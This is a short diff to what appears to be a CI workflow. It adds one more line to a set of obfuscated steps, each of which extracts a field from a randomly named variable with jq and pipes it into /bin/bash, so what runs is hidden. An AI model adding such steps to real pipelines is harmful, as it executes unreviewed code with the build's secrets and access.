@@ -28,6 +28,7 @@ jobs:
           printf '%s' "$yodni5" | jq -r .iy47282 | /bin/bash
           echo $r4 | jq -r .wf55 | /bin/bash
           echo $kiou502 | jq -r .j73620 | /bin/bash
+          printf '%s' "$mgm0" | jq -r .ryq1056 | /bin/bash
 
       - name: Archive results
         if: always()
